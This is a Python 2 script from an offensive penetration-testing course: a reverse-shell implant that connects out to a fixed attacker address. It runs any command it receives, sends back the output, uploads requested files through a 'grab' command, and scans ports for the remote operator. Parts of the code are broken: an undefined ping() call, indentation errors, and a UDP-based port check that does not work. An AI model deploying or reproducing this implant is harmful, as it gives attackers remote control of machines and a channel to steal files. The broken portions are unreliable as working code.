# Python For Offensive PenTest: A Complete Practical Course - All rights reserved 
# Follow me on LinkedIn  https://jo.linkedin.com/in/python2


import socket # For Building TCP Connection
import subprocess # To start the shell in the system
import os


#!/usr/bin/python
from scapy.all import *

TIMEOUT = 2
conf.verb = 0

def transfer(s,path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while packet != '':
            s.send(packet) 
            packet = f.read(1024)
        s.send('DONE')
        f.close()
        
    else: # the file doesn't exist
        s.send('Unable to find out the file')

def alive(ip):
  for ip in range(0, 256):
    packet = IP(dst=(ip), ttl=20)/ICMP()
    reply = sr1(packet, timeout=TIMEOUT)
    if not (reply is None):
         print reply.dst, "is online"
    else:
         print "Timeout waiting for %s" % packet[IP].dst
def scanner(s,ip,ports):
    
    scan_result = '' # scan_result is a variable stores our scanning result

     for port in ports.split(','): # remember the ports are separated by a comma in this format 21,22,..
        
         try: # we will try to make a connection using socket library for EACH one of these ports
            
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
             output = sock.connect_ex((ip, int(port) ))  #connect_ex This function returns 0 if the operation succeeded,  and in our case operation succeeded means that 
         #the connection happens whihch means the port is open otherwsie the port could be closed or the host is unreachable in the first place.
            
             if output == 0:
                 scan_result = scan_result + "[+] Port " +port+ " is opened" +'\n'

             else:
                 scan_result = scan_result + "[-] Port " +port+" is closed or Host is not reachable" +'\n'
                
             sock.close()
    
         except Exception, e:
             pass
     s.send (scan_result) # finally we send the result back to our kali


def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('10.10.10.100', 8080))
 
    while True: # keep recieving commands from the Kali machine
        command =  s.recv(1024)
        
        if 'terminate' in command:
            s.close()
            break # close the socket


        elif 'grab' in command: # grab*C:\Users\Hussam\Desktop\photo.jpeg
            grab,path = command.split('*')
            try:
                transfer(s,path)
            except Exception,e:
                s.send ( str(e) )
                pass

        elif 'alive' in command:
             command = command[5:]
             ping(ip)
        elif 'scan' in command:  # syntax: scan 10.10.10.100:22,80
            command = command[5:] # cut off the leading first 5 char 
            ip,ports = command.split(':') # split the output into two sections where the first variable is the ip which we want to scan and the second variable is the list of ports
                                          # that we want to check its status
            scanner(s,ip,ports)
            
   
        else:
            CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send( CMD.stdout.read()  ) # send the result
            s.send( CMD.stderr.read()  ) # in case you mistyped a command, we will send back the error

def main ():
    connect()
main()











